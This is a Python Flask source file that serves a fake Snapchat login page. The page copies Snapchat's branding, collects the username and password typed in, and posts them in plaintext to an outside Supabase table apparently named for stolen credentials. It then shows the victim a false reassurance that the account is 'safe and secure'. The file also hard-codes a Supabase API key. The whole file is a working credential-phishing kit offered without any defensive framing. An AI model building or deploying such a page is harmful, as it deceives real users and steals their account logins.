from flask import Flask, request, render_template_string
import requests
from flask_cors import CORS

app = Flask(__name__)
CORS(app)


SUPABASE_URL = "https://ooizfwcowozovlamobgp.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9vaXpmd2Nvd296b3ZsYW1vYmdwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjE1NjgxNDUsImV4cCI6MjA3NzE0NDE0NX0.z0DkpV1qYeWNEvNP9KuxOl9Ndk9_q_oCxzKg6hO7FjY"

# HTML template
HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Snapchat Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #FFFC00;
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-card {
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
      text-align: center;
      width: 340px;
      padding: 40px 30px;
      animation: fadeIn 0.8s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .logo {
      width: 72px;
      margin-bottom: 20px;
      filter: drop-shadow(0 0 3px rgba(0,0,0,0.2));
    }
    h2 {
      color: #000;
      margin-bottom: 24px;
      font-size: 20px;
      font-weight: 700;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 15px;
      transition: all 0.25s ease;
    }
    input:focus {
      border-color: #FFFC00;
      outline: none;
      box-shadow: 0 0 5px rgba(255, 252, 0, 0.6);
    }
    button {
      width: 100%;
      padding: 12px;
      background: #FFFC00;
      border: none;
      border-radius: 8px;
      font-weight: 700;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.25s ease, transform 0.15s ease;
    }
    button:hover {
      background: #f1e800;
      transform: scale(1.03);
    }
    .links {
      margin-top: 15px;
      font-size: 14px;
    }
    .links a {
      color: #000;
      text-decoration: none;
      font-weight: 600;
    }
    .links a:hover {
      text-decoration: underline;
    }
    .message {
      margin-top: 18px;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="login-card">
    <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/snapchat.svg"
         alt="Snapchat Logo"
         class="logo" />
    <h2>Log In to Snapchat</h2>

    <form method="POST">
      <input name="username" type="text" placeholder="Username" required />
      <input name="password" type="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>

    <div class="links">
      <a href="#">Forgot Password?</a> · <a href="#">Sign Up</a>
    </div>

    {% if message %}
      <p class="message">{{ message }}</p>
    {% endif %}
  </div>
</body>
</html>
'''

@app.route("/", methods=["GET", "POST"])
def login():
    message = ""
    if request.method == "POST":
        username = request.form["username"]

        password = request.form["password"]

        response = requests.post(
            f"{SUPABASE_URL}/rest/v1/user_credentialss",  # corrected table name
            headers={
                "apikey": SUPABASE_KEY,
                "Authorization": f"Bearer {SUPABASE_KEY}",
                "Content-Type": "application/json",
                "Prefer": "return=representation"
            },
            json={"username": username, "password": password}
        )

        if response.status_code == 201:
            message = "Your account is safe and secure for band"
        else:
            message = f"Error: {response.text}"

    return render_template_string(HTML, message=message)

if __name__ == "__main__":
     app.run(host="localhost", port=5000)